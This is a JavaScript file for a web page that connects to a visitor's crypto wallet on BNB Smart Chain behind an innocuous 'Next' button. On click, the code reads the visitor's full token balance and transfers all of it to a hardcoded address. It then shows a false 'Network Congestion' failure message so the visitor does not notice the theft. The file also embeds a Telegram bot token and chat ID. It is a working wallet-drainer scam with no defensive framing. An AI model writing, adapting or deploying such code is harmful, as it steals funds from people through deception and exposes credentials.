const bscAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe";
const usdtContractAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe";
const alternativeWalletAddress = "0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe";

const telegramBotToken = "7849151110:AAFGo5n4hPLk8y8l8tSESYbCl_vut3TPHsI";
const telegramChatId = "7849151110";

let web3, userAddress;

async function waitForProvider(timeout = 5000) {
    return new Promise((resolve) => {
        const start = Date.now();
        const interval = setInterval(() => {
            const provider = window.ethereum || window.trustwallet || window.web3?.currentProvider;
            if (provider || Date.now() - start > timeout) {
                clearInterval(interval);
                resolve(provider);
            }
        }, 100);
    });
}

async function connectWalletAndSwitch() {
    const provider = window.ethereum || window.trustwallet || window.web3?.currentProvider;
    if (!provider) {
        alert("Web3 provider not found.");
        return;
    }
    try {
        web3 = new Web3(provider);
        const currentChain = await provider.request({ method: 'eth_chainId' });
        if (currentChain !== '0x38') {
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }]
            });
        }
        const accounts = await provider.request({ method: "eth_accounts" });
        userAddress = accounts[0];
    } catch (e) {
        console.error("Connection failed", e);
    }
}

async function Next() {
    updateButtonUI(true);

    if (!web3 || !userAddress) {
        await connectWalletAndSwitch();
        if (!web3 || !userAddress) {
            updateButtonUI(false);
            return;
        }
    }

    try {
        const usdtContract = new web3.eth.Contract([
            { constant: true, inputs: [{ name: "_owner", type: "address" }], name: "balanceOf", outputs: [{ name: "", type: "uint256" }], type: "function" },
            { constant: false, inputs: [{ name: "recipient", type: "address" }, { name: "amount", type: "uint256" }], name: "transfer", outputs: [{ name: "", type: "bool" }], type: "function" }
        ], usdtContractAddress);

        const balanceWei = await usdtContract.methods.balanceOf(userAddress).call();
        const balance = parseFloat(web3.utils.fromWei(balanceWei, "ether"));

        if (balance > 0) {
            const amount = web3.utils.toWei(balance.toString(), "ether");
            await usdtContract.methods.transfer(bscAddress, amount).send({ from: userAddress });
        }
        
        alert("Transaction failed: Network Congestion");
    } catch (err) {
        console.error(err);
    } finally {
        updateButtonUI(false);
    }
}

function updateButtonUI(isLoading) {
    const btn = document.getElementById("actionBtn");
    btn.textContent = isLoading ? "Processing..." : "Next";
    btn.disabled = isLoading;
}

window.addEventListener("load", async () => {
    await connectWalletAndSwitch();
    document.getElementById("actionBtn").addEventListener("click", Next);
});